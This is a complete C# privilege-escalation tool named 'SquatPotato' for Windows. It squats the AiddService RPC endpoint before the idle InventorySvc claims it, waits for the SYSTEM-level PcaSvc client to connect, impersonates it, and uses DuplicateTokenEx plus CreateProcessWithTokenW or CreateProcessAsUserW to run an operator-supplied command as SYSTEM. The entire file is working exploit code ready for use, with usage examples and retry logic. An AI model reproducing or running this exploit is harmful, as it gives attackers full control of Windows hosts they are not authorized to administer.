// SquatPotato — coerce PcaSvc (SYSTEM) via demand-start endpoint pre-emption, then (from a
// SeImpersonatePrivilege-holding context) run an operator-supplied command as SYSTEM.
//
//   SquatPotato.exe "cmd.exe /c whoami > C:\Windows\System32\proof.txt 2>&1"
//   SquatPotato.exe -timeout 900 "powershell -c \"...\""
//
// Mechanism: create the ncalrpc:[AiddService] endpoint (owned by the demand-start, frequently-idle
// InventorySvc) before it does; PcaSvc's unauthenticated AiddService client then connects to us; we
// RpcImpersonateClient the SYSTEM caller and, if we hold SeImpersonatePrivilege (real service account
// / IIS / MSSQL / admin), DuplicateTokenEx + CreateProcessWithTokenW to run the command as SYSTEM.
// A standard user without SeImpersonatePrivilege is capped at IDENTIFICATION (reported, no spawn).
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Diagnostics;

class SquatPotato {
  [StructLayout(LayoutKind.Sequential)] struct SYN { public Guid G; public ushort Maj, Min; }
  [StructLayout(LayoutKind.Sequential)] struct RPC_SERVER_INTERFACE {
    public uint Length; public SYN InterfaceId; public SYN TransferSyntax; public IntPtr DispatchTable;
    public uint EpCount; public IntPtr Ep; public IntPtr DefMgr; public IntPtr Interp; public uint Flags; }
  [StructLayout(LayoutKind.Sequential)] struct RPC_DISPATCH_TABLE { public uint Count; public IntPtr Table; public IntPtr Reserved; }
  [StructLayout(LayoutKind.Sequential)] struct STARTUPINFO { public int cb; public IntPtr r1,r2,r3; public int dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags; public short wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }
  [StructLayout(LayoutKind.Sequential)] struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

  [DllImport("rpcrt4.dll", CharSet=CharSet.Unicode)] static extern int RpcServerUseProtseqEpW(string P, uint M, string E, IntPtr S);
  [DllImport("rpcrt4.dll")] static extern int RpcServerRegisterIf2(IntPtr If, IntPtr U, IntPtr E, uint F, uint MC, uint MS, IfCallback CB);
  [DllImport("rpcrt4.dll")] static extern int RpcServerListen(uint Min, uint Max, uint DontWait);
  [DllImport("rpcrt4.dll")] static extern int RpcImpersonateClient(IntPtr B);
  [DllImport("rpcrt4.dll")] static extern int RpcRevertToSelf();
  [DllImport("advapi32.dll", SetLastError=true)] static extern bool OpenThreadToken(IntPtr T, uint A, bool S, out IntPtr Tok);
  [DllImport("advapi32.dll", SetLastError=true)] static extern bool GetTokenInformation(IntPtr t, int cls, IntPtr buf, int len, out int ret);
  [DllImport("advapi32.dll", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr h, uint acc, IntPtr sa, int imp, int type, out IntPtr dup);
  [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
  static extern bool CreateProcessWithTokenW(IntPtr tok, uint logonFlags, string app, string cmd, uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
  [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
  static extern bool CreateProcessAsUserW(IntPtr tok, string app, string cmd, IntPtr pa, IntPtr ta, bool inh, uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
  [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
  [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);

  delegate int IfCallback(IntPtr If, IntPtr Ctx);
  static readonly Guid XFER   = new Guid("8A885D04-1CEB-11C9-9FE8-08002B104860"); // NDR 2.0
  static readonly Guid XFER64 = new Guid("71710533-BEBA-4937-8319-B5DBEF9CCC36"); // NDR64 1.0
  static readonly Guid IAIDD  = new Guid("a7e3b8c1-4d2f-4e9a-b5c6-8f7d9e0a1b2c");
  static string g_cmd;
  static volatile bool g_done = false;

  static void P(string s){ Console.WriteLine(s); Console.Out.Flush(); }

  static int Callback(IntPtr If, IntPtr Ctx) {
    if (RpcImpersonateClient(Ctx) != 0) return 5;
    string who="?", lvl="?";
    try {
      IntPtr tok;
      if (!OpenThreadToken(GetCurrentThread(), 0x0002|0x0008|0x0004|0x0001, true, out tok)) { RpcRevertToSelf(); return 5; }
      using (var wi = new WindowsIdentity(tok)) who = wi.Name + " / " + wi.User.Value;
      IntPtr lb = Marshal.AllocHGlobal(4); int rl;
      if (GetTokenInformation(tok, 9 /*TokenImpersonationLevel*/, lb, 4, out rl)) {
        int v = Marshal.ReadInt32(lb); lvl = (v==2?"IMPERSONATION":(v==1?"IDENTIFICATION":"level"+v));
      }
      Marshal.FreeHGlobal(lb);
      P("[+] SYSTEM client connected: " + who + "   impersonation-level=" + lvl);
      if (lvl != "IMPERSONATION") {
        P("[-] level is " + lvl + " -> caller lacks SeImpersonatePrivilege; cannot spawn. (std-user path: info-disclosure only)");
        RpcRevertToSelf(); CloseHandle(tok); return 5;
      }
      IntPtr prim;
      bool dup = DuplicateTokenEx(tok, 0x02000000, IntPtr.Zero, 2, 1 /*TokenPrimary*/, out prim);
      RpcRevertToSelf();
      if (!dup) { P("[-] DuplicateTokenEx failed " + Marshal.GetLastWin32Error()); CloseHandle(tok); return 5; }
      var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
      PROCESS_INFORMATION pi;
      bool ok = CreateProcessWithTokenW(prim, 0, null, g_cmd, 0x08000000 /*CREATE_NO_WINDOW*/, IntPtr.Zero, null, ref si, out pi);
      if (!ok) { // fallback: CreateProcessAsUser (needs SeAssignPrimaryToken+SeIncreaseQuota)
        int e1 = Marshal.GetLastWin32Error();
        ok = CreateProcessAsUserW(prim, null, g_cmd, IntPtr.Zero, IntPtr.Zero, false, 0x08000000, IntPtr.Zero, null, ref si, out pi);
        if (!ok) P("[-] spawn failed: CreateProcessWithTokenW=" + e1 + " CreateProcessAsUserW=" + Marshal.GetLastWin32Error());
      }
      if (ok) { P("[***] RAN AS SYSTEM (pid " + pi.dwProcessId + "): " + g_cmd); g_done = true; }
      CloseHandle(prim); CloseHandle(tok);
    } catch (Exception ex) { RpcRevertToSelf(); P("[-] " + ex.Message); }
    return 5;
  }

  static IntPtr MakeIf(Guid syn, ushort maj, IntPtr dt) {
    var si=new RPC_SERVER_INTERFACE(); si.Length=(uint)Marshal.SizeOf(typeof(RPC_SERVER_INTERFACE));
    si.InterfaceId.G=IAIDD; si.InterfaceId.Maj=1; si.InterfaceId.Min=0;
    si.TransferSyntax.G=syn; si.TransferSyntax.Maj=maj; si.TransferSyntax.Min=0;
    si.DispatchTable=dt; IntPtr p=Marshal.AllocHGlobal((int)si.Length); Marshal.StructureToPtr(si,p,false); return p;
  }

  static void Main(string[] args) {
    int waitSec = 1800;
    var cmdParts = new System.Collections.Generic.List<string>();
    for (int i=0;i<args.Length;i++) {
      if (args[i] == "-timeout" && i+1 < args.Length) { waitSec = int.Parse(args[++i]); }
      else cmdParts.Add(args[i]);
    }
    g_cmd = cmdParts.Count > 0 ? string.Join(" ", cmdParts.ToArray())
                              : "cmd.exe /c whoami > C:\\Windows\\System32\\squatpotato_proof.txt 2>&1";
    P("SquatPotato — running as: " + WindowsIdentity.GetCurrent().Name);
    P("  SYSTEM command: " + g_cmd);
    P("  (needs SeImpersonatePrivilege to spawn; a plain std user is capped at IDENTIFICATION)");

    IntPtr dt=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RPC_DISPATCH_TABLE))); Marshal.StructureToPtr(new RPC_DISPATCH_TABLE(),dt,false);
    var sw=Stopwatch.StartNew(); int rc=1740, tries=0;
    P("[*] waiting for the InventorySvc idle window to squat ncalrpc:[AiddService]...");
    while (sw.Elapsed.TotalSeconds < waitSec) {
      rc = RpcServerUseProtseqEpW("ncalrpc",100,"AiddService",IntPtr.Zero); tries++;
      if (rc==0) { P("[+] squatted AiddService after " + tries + " tries"); break; }
      Thread.Sleep(1000);
    }
    if (rc!=0) { P("[-] no free window in " + waitSec + "s"); return; }
    IfCallback cb = Callback;
    RpcServerRegisterIf2(MakeIf(XFER,2,dt),   IntPtr.Zero, IntPtr.Zero, 0x10, 100, 0x100000, cb);
    RpcServerRegisterIf2(MakeIf(XFER64,1,dt), IntPtr.Zero, IntPtr.Zero, 0x10, 100, 0x100000, cb);
    RpcServerListen(1,100,1);
    P("[*] holding endpoint + IAiddService (NDR+NDR64) — waiting for PcaSvc's connect (launch a few processes to hasten it)...");
    GC.KeepAlive(cb);
    while (sw.Elapsed.TotalSeconds < waitSec && !g_done) Thread.Sleep(500);
    P(g_done ? "[*] done — command executed as SYSTEM." : "[*] timed out.");
  }
}
